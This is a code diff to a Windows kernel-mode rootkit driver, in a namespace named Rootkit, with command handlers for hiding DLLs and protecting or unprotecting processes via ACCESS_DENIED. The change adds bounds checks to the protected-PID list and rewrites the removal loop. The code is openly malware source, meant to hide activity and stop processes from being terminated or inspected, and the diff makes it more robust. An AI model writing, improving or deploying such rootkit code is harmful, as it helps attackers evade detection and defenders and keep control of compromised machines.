@@ -4,6 +4,8 @@
 #pragma warning(push)
 #pragma warning(disable: 4100)  // Unreferenced formal parameter
 #pragma warning(disable : 4099)
+#define MAX_PIDS 256
+#define MAX_TIDS 256
 #define SHARED_MEM_SIZE 512
 #define EVENT_NAME L"\\BaseNamedObjects\\MySharedEvent"
 #define SECTION_NAME L"\\BaseNamedObjects\\MySharedSection"
@@ -23,7 +25,7 @@ PDEVICE_OBJECT g_DeviceObject;
 #ifdef DL
 PVOID regHandle;
 ULONG protectedPidIndex = 0;
-ULONG protectedPid[] = { 0 };
+ULONG protectedPid[MAX_PIDS] = { 0 };
 
 PVOID gSharedBuffer = NULL;
 PKEVENT gUserEvent = NULL;
@@ -691,37 +693,52 @@ namespace Rootkit {
         case codes::HideDLL:
             HideDLL(HandleToUlong(pid), DLLName);
             break;
-#ifdef DL
         case codes::UnProtectProcess:
             UnProtectProcess(HandleToUlong(pid));
             break;
+#ifdef DL
         case codes::ProtectProcessOP:
-            protectedPid[protectedPidIndex++] = HandleToUlong(pid);
-            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been protected successfully. (ACCESS_DENIED Protection)");
+            if (protectedPidIndex < MAX_PIDS) {
+                protectedPid[protectedPidIndex++] = HandleToUlong(pid);
+                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been protected successfully. (ACCESS_DENIED Protection)");
+            }
+            else {
+                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Protected PID list is full.");
+            }
             break;
         case codes::UnProtectProcessOP:
         {
             BOOLEAN found = FALSE;
-            for (ULONG i = 0; i < protectedPidIndex; i++) {
-                if (protectedPid[i] == HandleToUlong(pid)) {
-                    // Shift remaining elements left
-                    for (ULONG j = i; j < protectedPidIndex - 1; j++) {
-                        protectedPid[j] = protectedPid[j + 1];
+            if (protectedPidIndex > 0) {
+                ULONG searchPid = HandleToUlong(pid);
+                ULONG writeIndex = 0;
+                for (ULONG readIndex = 0; readIndex < protectedPidIndex; ++readIndex) {
+                    if (protectedPid[readIndex] != searchPid) {
+                        // Keep this PID
+                        protectedPid[writeIndex++] = protectedPid[readIndex];
                     }
-                    protectedPidIndex--; // Decrease the count
-                    found = TRUE;
-                    break; // Exit after removing one instance
+                    else {
+                        found = TRUE;
+                    }
                 }
+                protectedPidIndex = writeIndex;
             }
 
-            // Queue work item only if we actually unprotected a process
-            if (found) {
-                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue,
-                    (PVOID)"[+] Process has been unprotected successfully. (ACCESS_DENIED Protection)");
-            }
-            else {
-                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue,
-                    (PVOID)"[-] Process was not found in protected list.");
+            if (workItem != NULL) {
+                if (found) {
+                    IoQueueWorkItem(workItem,
+                        MsgClientWorkerRoutine,
+                        DelayedWorkQueue,
+                        (PVOID)"[+] Process has been unprotected successfully. (ACCESS_DENIED Protection)"
+                    );
+                }
+                else {
+                    IoQueueWorkItem(workItem,
+                        MsgClientWorkerRoutine,
+                        DelayedWorkQueue,
+                        (PVOID)"[-] Process was not found in protected list."
+                    );
+                }
             }
             break;
         }
